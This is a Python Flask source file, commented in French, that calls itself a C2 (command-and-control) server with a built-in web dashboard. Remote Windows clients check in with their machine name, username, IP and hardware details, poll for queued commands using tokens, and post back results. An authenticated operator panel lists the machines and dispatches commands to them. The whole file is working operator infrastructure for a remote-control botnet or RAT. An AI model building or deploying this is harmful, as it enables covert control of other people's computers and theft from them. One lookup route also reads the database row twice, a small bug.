# -*- coding: utf-8 -*-
# server.py - Serveur C2 avec interface web intégrée

import os
import sqlite3
import json
import datetime
import hashlib
import secrets
import time
from functools import wraps
from flask import Flask, request, jsonify, render_template, session, redirect, url_for

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    import subprocess
    subprocess.check_call(['pip', 'install', 'python-dotenv', '--quiet'])
    from dotenv import load_dotenv
    load_dotenv()

app = Flask(__name__)

# Configuration sécurisée
def load_secure_config():
    """Charge la configuration de manière sécurisée"""
    config = {}
    
    # Chargement depuis les variables d'environnement
    config['SECRET_KEY'] = os.environ.get('SECRET_KEY')
    config['ADMIN_USERNAME'] = os.environ.get('ADMIN_USERNAME')
    config['ADMIN_PASSWORD'] = os.environ.get('ADMIN_PASSWORD')
    
    # Si pas dans l'environnement, essayer le fichier .env
    if not all([config['SECRET_KEY'], config['ADMIN_USERNAME'], config['ADMIN_PASSWORD']]):
        env_file = os.path.join(os.path.dirname(__file__), '.env')
        if os.path.exists(env_file):
            with open(env_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#') and '=' in line:
                        key, value = line.split('=', 1)
                        key = key.strip()
                        value = value.strip().strip('"').strip("'")
                        if key in ['SECRET_KEY', 'ADMIN_USERNAME', 'ADMIN_PASSWORD']:
                            config[key] = value
    
    # Validation de la configuration
    if not config['SECRET_KEY'] or len(config['SECRET_KEY']) < 32:
        print("[ERREUR CRITIQUE] SECRET_KEY manquante ou trop courte (minimum 32 caractères)")
        print("Veuillez configurer SECRET_KEY dans le fichier .env ou les variables d'environnement")
        exit(1)
    
    if not config['ADMIN_USERNAME'] or not config['ADMIN_PASSWORD']:
        print("[ERREUR CRITIQUE] ADMIN_USERNAME ou ADMIN_PASSWORD manquant")
        print("Veuillez configurer ces variables dans le fichier .env ou les variables d'environnement")
        exit(1)
    
    if len(config['ADMIN_PASSWORD']) < 8:
        print("[AVERTISSEMENT] Le mot de passe admin est trop court (minimum 8 caractères recommandé)")
    
    return config

# Chargement de la configuration sécurisée
CONFIG = load_secure_config()
app.secret_key = CONFIG['SECRET_KEY']

# Protection contre les attaques par force brute
failed_attempts = {}
RATE_LIMIT_ATTEMPTS = 5
RATE_LIMIT_WINDOW = 300  # 5 minutes

DATABASE = 'c2_clients.db'

def init_db():
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS clients (
        machine_id TEXT PRIMARY KEY,
        computer_name TEXT,
        username TEXT,
        windows_version TEXT,
        ip TEXT,
        last_seen TIMESTAMP,
        token TEXT,
        disk_total INTEGER,
        disk_free INTEGER,
        ram_total INTEGER,
        ram_available INTEGER,
        status TEXT DEFAULT 'active',
        client_version TEXT DEFAULT 'unknown',
        last_update TIMESTAMP
    )''')
    # Ajout des colonnes si la table existe déjà
    try:
        c.execute("ALTER TABLE clients ADD COLUMN client_version TEXT DEFAULT 'unknown'")
    except sqlite3.OperationalError:
        pass
    try:
        c.execute("ALTER TABLE clients ADD COLUMN last_update TIMESTAMP")
    except sqlite3.OperationalError:
        pass
    
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        machine_id TEXT,
        command_type TEXT,
        params TEXT,
        status TEXT DEFAULT 'pending',
        created_at TIMESTAMP,
        executed_at TIMESTAMP,
        result TEXT,
        FOREIGN KEY(machine_id) REFERENCES clients(machine_id)
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS activity_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        action TEXT,
        machine_id TEXT,
        details TEXT,
        timestamp TIMESTAMP
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS admins (
        username TEXT PRIMARY KEY,
        password_hash TEXT,
        created_at TIMESTAMP,
        last_login TIMESTAMP
    )''')
    
    # Mise à jour de l'admin avec les credentials du .env
    admin_username = CONFIG['ADMIN_USERNAME']
    admin_password = CONFIG['ADMIN_PASSWORD']
    
    # Hash sécurisé avec salt
    salt = secrets.token_hex(32)
    password_hash = hashlib.pbkdf2_hmac('sha256', admin_password.encode(), salt.encode(), 100000)
    final_hash = salt + ':' + password_hash.hex()
    
    c.execute("INSERT OR REPLACE INTO admins (username, password_hash, created_at) VALUES (?, ?, ?)", 
              (admin_username, final_hash, datetime.datetime.now()))
    conn.commit()
    conn.close()

init_db()

def get_db():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

def log_activity(action, machine_id=None, details=None):
    conn = get_db()
    client_ip = request.remote_addr if request else 'system'
    full_details = f"IP: {client_ip}"
    if details:
        full_details += f" | {details}"
    
    conn.execute('INSERT INTO activity_logs (action, machine_id, details, timestamp) VALUES (?, ?, ?, ?)',
                 (action, machine_id, full_details, datetime.datetime.now()))
    conn.commit()
    conn.close()

def check_rate_limit(ip):
    current_time = time.time()
    if ip in failed_attempts:
        attempts, first_attempt = failed_attempts[ip]
        if current_time - first_attempt > RATE_LIMIT_WINDOW:
            del failed_attempts[ip]
            return True
        if attempts >= RATE_LIMIT_ATTEMPTS:
            return False
    return True

def record_failed_attempt(ip):
    current_time = time.time()
    if ip in failed_attempts:
        attempts, first_attempt = failed_attempts[ip]
        failed_attempts[ip] = (attempts + 1, first_attempt)
    else:
        failed_attempts[ip] = (1, current_time)

def verify_password(stored_hash, provided_password):
    try:
        salt, hash_hex = stored_hash.split(':')
        hash_bytes = bytes.fromhex(hash_hex)
        provided_hash = hashlib.pbkdf2_hmac('sha256', provided_password.encode(), salt.encode(), 100000)
        return hash_bytes == provided_hash
    except:
        return False

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            log_activity('unauthorized_access_attempt', None, f"Route: {request.endpoint}")
            return redirect(url_for('login'))
        if 'session_token' not in session:
            session.clear()
            log_activity('invalid_session', None, f"Route: {request.endpoint}")
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

def api_auth_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session or 'session_token' not in session:
            log_activity('unauthorized_api_access', None, f"Route: {request.endpoint}")
            return jsonify({'error': 'Unauthorized access'}), 401
        return f(*args, **kwargs)
    return decorated_function

def generate_token(machine_id):
    secret = CONFIG['SECRET_KEY']
    return hashlib.sha256(f"{machine_id}{secret}{datetime.datetime.now()}".encode()).hexdigest()[:32]

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.get_json()
    if not data or 'machine_id' not in data:
        return jsonify({'error': 'missing machine_id'}), 400
    
    machine_id = data['machine_id']
    client_version = data.get('client_version', 'unknown')
    last_update = data.get('last_update')
    
    conn = get_db()
    cur = conn.execute('SELECT * FROM clients WHERE machine_id = ?', (machine_id,))
    client = cur.fetchone()
    token = generate_token(machine_id) if not client else client['token']
    
    conn.execute('''INSERT OR REPLACE INTO clients 
        (machine_id, computer_name, username, windows_version, ip, last_seen, token,
         disk_total, disk_free, ram_total, ram_available, status,
         client_version, last_update)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
        (machine_id, data.get('computer_name'), data.get('username'), data.get('windows_version'),
         data.get('ip'), datetime.datetime.now(), token,
         data.get('disk', {}).get('total'), data.get('disk', {}).get('free'),
         data.get('ram', {}).get('total'), data.get('ram', {}).get('available'),
         'active', client_version, last_update))
    conn.commit()
    conn.close()
    log_activity('heartbeat', machine_id, f"IP: {data.get('ip')}")
    return jsonify({'status': 'ok', 'token': token})

@app.route('/api/commands/<machine_id>', methods=['GET'])
def get_commands(machine_id):
    auth = request.headers.get('Authorization')
    if not auth or not auth.startswith('Bearer '):
        return jsonify({'error': 'unauthorized'}), 401
    token = auth.split(' ')[1]
    conn = get_db()
    cur = conn.execute('SELECT token FROM clients WHERE machine_id = ?', (machine_id,))
    row = cur.fetchone()
    if not row or row['token'] != token:
        conn.close()
        return jsonify({'error': 'invalid token'}), 401
    cur = conn.execute('SELECT id, command_type, params FROM commands WHERE machine_id = ? AND status = "pending" ORDER BY created_at ASC', (machine_id,))
    commands = [{'id': r['id'], 'type': r['command_type'], 'params': json.loads(r['params']) if r['params'] else {}} for r in cur.fetchall()]
    conn.close()
    return jsonify({'commands': commands})

@app.route('/api/command_result', methods=['POST'])
def command_result():
    data = request.get_json()
    if not data or 'machine_id' not in data or 'command_id' not in data:
        return jsonify({'error': 'missing fields'}), 400
    machine_id = data['machine_id']
    command_id = data['command_id']
    result = data.get('result')
    conn = get_db()
    conn.execute('UPDATE commands SET status = "executed", executed_at = ?, result = ? WHERE id = ?',
                 (datetime.datetime.now(), json.dumps(result), command_id))
    conn.commit()
    conn.close()
    log_activity('command_result', machine_id, f"Command {command_id} executed")
    return jsonify({'status': 'ok'})

@app.route('/api/clients')
@api_auth_required
def api_clients():
    conn = get_db()
    cur = conn.execute('''SELECT machine_id, computer_name, username, windows_version, ip,
                          last_seen, status, disk_total, disk_free, ram_total, ram_available,
                          client_version, last_update
                          FROM clients ORDER BY last_seen DESC''')
    clients = []
    for r in cur.fetchall():
        client = dict(r)
        if client['last_seen']:
            delta = datetime.datetime.now() - datetime.datetime.fromisoformat(client['last_seen'].replace(' ', 'T'))
            client['online'] = delta.total_seconds() < 300
        else:
            client['online'] = False
        clients.append(client)
    conn.close()
    return jsonify(clients)

@app.route('/api/client/<machine_id>')
@api_auth_required
def api_client_detail(machine_id):
    conn = get_db()
    cur = conn.execute('SELECT * FROM clients WHERE machine_id = ?', (machine_id,))
    client = dict(cur.fetchone()) if cur.fetchone() else None
    conn.close()
    return jsonify(client)

@app.route('/api/commands/history/<machine_id>')
@api_auth_required
def api_commands_history(machine_id):
    conn = get_db()
    cur = conn.execute('SELECT id, command_type, params, status, created_at, executed_at, result FROM commands WHERE machine_id = ? ORDER BY created_at DESC LIMIT 50', (machine_id,))
    commands = []
    for r in cur.fetchall():
        cmd = dict(r)
        try:
            cmd['params'] = json.loads(cmd['params']) if cmd['params'] else {}
            cmd['result'] = json.loads(cmd['result']) if cmd['result'] else None
        except:
            pass
        commands.append(cmd)
    conn.close()
    return jsonify(commands)

@app.route('/api/send_command', methods=['POST'])
@api_auth_required
def api_send_command():
    data = request.get_json()
    if not data or 'machine_id' not in data or 'command_type' not in data:
        return jsonify({'error': 'missing fields'}), 400
    machine_id = data['machine_id']
    command_type = data['command_type']
    params = data.get('params', {})
    conn = get_db()
    cur = conn.execute('SELECT machine_id FROM clients WHERE machine_id = ?', (machine_id,))
    if not cur.fetchone():
        conn.close()
        return jsonify({'error': 'client not found'}), 404
    cursor = conn.execute('INSERT INTO commands (machine_id, command_type, params, created_at, status) VALUES (?, ?, ?, ?, "pending")',
                          (machine_id, command_type, json.dumps(params), datetime.datetime.now()))
    command_id = cursor.lastrowid
    conn.commit()
    conn.close()
    log_activity('send_command', machine_id, f"Commande: {command_type}")
    return jsonify({'status': 'command queued', 'command_id': command_id, 'command_type': command_type})

@app.route('/api/command_result/<int:command_id>')
@api_auth_required
def api_command_result(command_id):
    conn = get_db()
    cur = conn.execute('SELECT result, status, command_type FROM commands WHERE id = ?', (command_id,))
    row = cur.fetchone()
    conn.close()
    if row:
        try:
            result = json.loads(row['result']) if row['result'] else None
        except:
            result = row['result']
        return jsonify({'status': row['status'], 'result': result, 'command_type': row['command_type']})
    return jsonify({'error': 'not found'}), 404

@app.route('/api/stats')
@api_auth_required
def api_stats():
    conn = get_db()
    total_clients = conn.execute('SELECT COUNT(*) FROM clients').fetchone()[0]
    online_clients = conn.execute('SELECT COUNT(*) FROM clients WHERE last_seen > ?', (datetime.datetime.now() - datetime.timedelta(minutes=5),)).fetchone()[0]
    pending_commands = conn.execute('SELECT COUNT(*) FROM commands WHERE status = "pending"').fetchone()[0]
    executed_commands = conn.execute('SELECT COUNT(*) FROM commands WHERE status = "executed"').fetchone()[0]
    conn.close()
    return jsonify({
        'total_clients': total_clients,
        'online_clients': online_clients,
        'pending_commands': pending_commands,
        'executed_commands': executed_commands
    })

@app.route('/api/activities')
@api_auth_required
def api_activities():
    conn = get_db()
    cur = conn.execute('SELECT action, machine_id, details, timestamp FROM activity_logs ORDER BY timestamp DESC LIMIT 50')
    activities = [dict(r) for r in cur.fetchall()]
    conn.close()
    return jsonify(activities)

@app.route('/login', methods=['GET', 'POST'])
def login():
    client_ip = request.remote_addr
    
    if request.method == 'POST':
        if not check_rate_limit(client_ip):
            log_activity('rate_limit_exceeded', None, f"IP bloquée temporairement")
            return render_template('login.html', error='Trop de tentatives. Réessayez dans 5 minutes.')
        
        username = request.form.get('username')
        password = request.form.get('password')
        
        if not username or not password:
            record_failed_attempt(client_ip)
            log_activity('login_attempt_missing_fields', None)
            return render_template('login.html', error='Nom d\'utilisateur et mot de passe requis')
        
        conn = get_db()
        cur = conn.execute('SELECT password_hash FROM admins WHERE username = ?', (username,))
        admin = cur.fetchone()
        
        if admin and verify_password(admin['password_hash'], password):
            session['logged_in'] = True
            session['username'] = username
            session['session_token'] = secrets.token_hex(32)
            session['login_time'] = datetime.datetime.now().isoformat()
            
            conn.execute('UPDATE admins SET last_login = ? WHERE username = ?', 
                        (datetime.datetime.now(), username))
            conn.commit()
            
            if client_ip in failed_attempts:
                del failed_attempts[client_ip]
            
            log_activity('login_success', None, f"Admin {username} connecté avec succès")
            conn.close()
            return redirect(url_for('dashboard'))
        else:
            record_failed_attempt(client_ip)
            log_activity('login_failed', None, f"Tentative avec username: {username}")
            
        conn.close()
        return render_template('login.html', error='Identifiants incorrects')
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    username = session.get('username', 'unknown')
    log_activity('logout', None, f"Admin {username} déconnecté")
    session.clear()
    return redirect(url_for('login'))

@app.route('/')
@login_required
def dashboard():
    return render_template('index.html', username=session.get('username'))

@app.after_request
def set_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com; font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com;"
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
    return response

@app.before_request
def security_checks():
    if request.path.startswith('/.env') or request.path.startswith('/config'):
        log_activity('blocked_sensitive_file_access', None, f"Path: {request.path}")
        return jsonify({'error': 'Access denied'}), 403
    
    if request.path.startswith('/login') and request.method == 'POST':
        client_ip = request.remote_addr
        if not check_rate_limit(client_ip):
            log_activity('rate_limit_blocked', None, f"IP: {client_ip}")
            return jsonify({'error': 'Too many attempts'}), 429

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"[INFO] Serveur C2 démarré sur le port {port}")
    print(f"[INFO] Admin configuré: {CONFIG['ADMIN_USERNAME']}")
    print(f"[SÉCURITÉ] Toutes les routes sont protégées par authentification")
    app.run(host='0.0.0.0', port=port, debug=False)
